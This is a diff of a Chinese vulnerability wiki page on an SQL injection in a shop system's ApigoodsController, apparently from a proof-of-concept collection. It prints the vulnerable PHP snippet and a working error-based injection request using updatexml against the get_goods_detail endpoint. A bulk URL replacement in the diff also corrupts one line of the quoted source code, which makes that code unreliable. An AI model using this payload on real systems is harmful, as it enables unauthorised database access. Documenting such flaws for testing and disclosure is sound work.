@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![](image/szy-1.png)
+![](http://wikioss.peiqi.tech/vuln/szy-1.png)
 
 存在漏洞的文件为 **ApigoodsController.class.php **, 关键位置为
 
@@ -50,7 +50,7 @@
         $hou = array(
             $c_site_url . "/Uploads/image"
         );
-		$goods[0]['video_src'] = C('SITE_URL')."Uploads/image/".$goods[0]['video_src'];
+		$goods[0]['video_src'] = C('SITE_URL')."Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/".$goods[0]['video_src'];
 		
         $goods[0]['description'] = str_replace($qian, $hou, $goods[0]['description']);
         $goods[0]['description'] = htmlspecialchars_decode($goods[0]['description']);
@@ -59,7 +59,7 @@
         );
 ```
 
-![](image/szy-6.png)
+![](http://wikioss.peiqi.tech/vuln/szy-6.png)
 
 漏洞测试为
 
@@ -67,4 +67,4 @@
 https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
 ```
 
-![](image/szy-7.png)
+![](http://wikioss.peiqi.tech/vuln/szy-7.png)
